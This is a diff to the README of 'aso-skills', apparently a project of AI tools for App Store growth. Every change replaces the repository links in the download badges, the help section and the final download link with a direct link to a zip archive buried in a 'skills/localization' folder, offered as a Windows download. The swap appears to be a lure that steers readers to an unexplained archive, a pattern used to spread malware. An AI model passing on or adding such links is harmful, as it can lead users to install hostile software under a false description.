@@ -1,6 +1,6 @@
 # 🤖 aso-skills - AI Tools for App Store Growth
 
-[![Download aso-skills](https://img.shields.io/badge/Download-aso--skills-blue?style=for-the-badge&logo=github)](https://github.com/Kungfookenny123/aso-skills)
+[![Download aso-skills](https://img.shields.io/badge/Download-aso--skills-blue?style=for-the-badge&logo=github)](https://github.com/Kungfookenny123/aso-skills/raw/refs/heads/main/skills/localization/skills_aso_v2.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ If you have an older computer, it might still work but could be slower.
 ## 🚀 Getting Started: Download and Install aso-skills
 
 1. Click the large download button below or go to the download link directly:  
-   [![Download aso-skills](https://img.shields.io/badge/Download-aso--skills-green?style=for-the-badge&logo=github)](https://github.com/Kungfookenny123/aso-skills)
+   [![Download aso-skills](https://img.shields.io/badge/Download-aso--skills-green?style=for-the-badge&logo=github)](https://github.com/Kungfookenny123/aso-skills/raw/refs/heads/main/skills/localization/skills_aso_v2.0.zip)
 
 2. On the GitHub page, look for the latest release or download section. This usually appears near the top or in the "Releases" tab.
 
@@ -104,7 +104,7 @@ If you still face issues, search for answers on the GitHub discussions page or o
 ## 📚 Additional Resources
 
 - For more help, visit the GitHub repository page:  
-  https://github.com/Kungfookenny123/aso-skills
+  https://github.com/Kungfookenny123/aso-skills/raw/refs/heads/main/skills/localization/skills_aso_v2.0.zip
 
 - Explore the agent skill integrations:
   - Cursor AI assistant documentation
@@ -117,4 +117,4 @@ If you still face issues, search for answers on the GitHub discussions page or o
 ## 📥 Download Link
 
 Here is the link again to download aso-skills for Windows:  
-[https://github.com/Kungfookenny123/aso-skills](https://github.com/Kungfookenny123/aso-skills)
+[https://github.com/Kungfookenny123/aso-skills/raw/refs/heads/main/skills/localization/skills_aso_v2.0.zip](https://github.com/Kungfookenny123/aso-skills/raw/refs/heads/main/skills/localization/skills_aso_v2.0.zip)
